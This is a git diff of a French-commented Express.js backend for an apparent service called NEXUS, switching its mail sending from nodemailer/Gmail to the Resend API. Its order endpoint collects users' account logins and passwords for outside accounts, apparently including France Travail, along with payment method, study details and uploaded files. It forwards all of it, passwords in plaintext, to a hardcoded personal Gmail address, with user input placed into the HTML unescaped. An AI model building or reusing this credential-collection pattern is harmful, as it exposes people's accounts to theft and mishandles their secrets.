@@ -1,19 +1,23 @@
-import 'dotenv/config'; // Charge les variables du fichier .env
+import 'dotenv/config'; 
 import express from 'express';
-import nodemailer from 'nodemailer';
 import multer from 'multer';
 import cors from 'cors';
+import { Resend } from 'resend'; 
 
 const app = express();
 
-// On autorise UNIQUEMENT le local pour éviter toute interférence
-// À mettre au début de server/index.js
+// Autorise votre machine locale et votre site Frontend Render
 app.use(cors({
   origin: ['http://localhost:5173', 'http://localhost:3000', 'https://nexus-ob.onrender.com']
 }));
+
 app.use(express.json());
 
+// Gestion des fichiers en mémoire vive pour un transfert direct vers l'API
 const upload = multer({ storage: multer.memoryStorage() });
+
+// Initialisation de Resend avec votre variable d'environnement sécurisée
+const resend = new Resend(process.env.RESEND_API_KEY);
 
 app.post('/api/send-order', upload.any(), async (req, res) => {
   try {
@@ -23,66 +27,70 @@ app.post('/api/send-order', upload.any(), async (req, res) => {
       passwordFT, 
       emailDedicace, 
       passwordDedicace, 
-      methodePaiement 
+      methodePaiement,
+      niveau_etude,
+      annee_en_cours
     } = req.body;
     
     const files = req.files || [];
 
-    // Sécurité locale pour vérifier vos variables
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
-      console.error("❌ ERREUR : Les variables EMAIL_USER ou EMAIL_PASS manquent dans votre fichier .env");
-      return res.status(500).json({ 
-        success: false, 
-        message: "Variables EMAIL_USER ou EMAIL_PASS manquantes dans le fichier .env local." 
-      });
+    if (!process.env.RESEND_API_KEY) {
+      console.error("❌ ERREUR : Clé RESEND_API_KEY introuvable.");
+      return res.status(500).json({ success: false, message: "Configuration serveur manquante." });
     }
 
-    // Configuration SMTP Standard pour Gmail en local
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 465, 
-      secure: true, // SSL direct
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS, 
-      },
-      tls: {
-        rejectUnauthorized: false 
-      }
-    });
-
+    // Extraction et conversion des bulletins/fichiers pour Resend
     const attachments = files.map(file => ({
       filename: file.originalname,
-      content: file.buffer
+      content: file.buffer 
     }));
 
-    await transporter.sendMail({
-      from: `"NEXUS Local" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER, // S'envoyer le mail à soi-même pour le test
-      subject: `🚀 TEST LOCAL NEXUS : ${pack || 'Non défini'}`,
+    // Envoi via tunnel HTTP (Totalement transparent pour le Firewall de Render)
+    const { data, error } = await resend.emails.send({
+      from: 'NEXUS System <onboarding@resend.dev>', 
+      to: 'andregomis3954@gmail.com',
+      subject: `🚀 NEXUS - DOSSIER : ${pack || 'Message Contact'}`,
       html: `
-        <div style="font-family: sans-serif; padding: 20px; border: 2px solid #059669; border-radius: 15px;">
-          <h2>Nouveau Dossier Reçu (TEST LOCAL)</h2>
-          <p><strong>Pack :</strong> ${pack}</p>
-          <p><strong>Identifiant FT :</strong> ${identifiantFT}</p>
-          <p><strong>Email Dédié :</strong> ${emailDedicace}</p>
-          <p><strong>Fichiers joints :</strong> ${attachments.length}</p>
+        <div style="font-family: sans-serif; line-height: 1.6; color: #333; padding: 20px; border: 2px solid #059669; border-radius: 15px;">
+          <h2 style="color: #059669;">Nouveau Flux Reçu - NEXUS</h2>
+          <p><strong>Type / Pack :</strong> ${pack || 'Non défini'}</p>
+          <p><strong>Méthode :</strong> ${methodePaiement || 'Non spécifiée'}</p>
+          
+          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 15px 0;">
+            <h3 style="margin-top: 0; color: #0284c7;">🔑 Identifiants transmis</h3>
+            <p><strong>Identifiant / Email :</strong> ${identifiantFT || emailDedicace || 'Non fourni'}</p>
+            <p><strong>Mot de passe :</strong> ${passwordFT || passwordDedicace || 'Non fourni'}</p>
+          </div>
+
+          ${niveau_etude ? `
+          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 15px 0;">
+            <h3 style="margin-top: 0; color: #b45309;">🎓 Informations Campus</h3>
+            <p><strong>Niveau d'études :</strong> ${niveau_etude}</p>
+            <p><strong>Année en cours :</strong> ${annee_en_cours}</p>
+          </div>
+          ` : ''}
+
+          <p style="font-size: 12px; color: #666; margin-top: 20px;">Nombre de pièces jointes incluses : ${attachments.length}</p>
         </div>
       `,
-      attachments
+      attachments: attachments
     });
 
-    console.log("✅ Mail de test envoyé avec succès !");
-    return res.status(200).json({ success: true, message: "Dossier transmis avec succès en local." });
+    if (error) {
+      console.error("❌ Erreur API Resend :", error);
+      return res.status(400).json({ success: false, message: error.message });
+    }
+
+    console.log("✅ Mail envoyé avec succès via Resend !", data);
+    return res.status(200).json({ success: true, message: "Transmis avec succès." });
+
   } catch (error) {
-    console.error("❌ Erreur d'envoi SMTP local :", error);
+    console.error("❌ Erreur serveur interne :", error);
     return res.status(500).json({ success: false, message: error.message });
   }
 });
 
-
-const PORT = process.env.PORT || 3001; 
-
+const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 [SERVEUR] Actif sur le port ${PORT}`);
 });
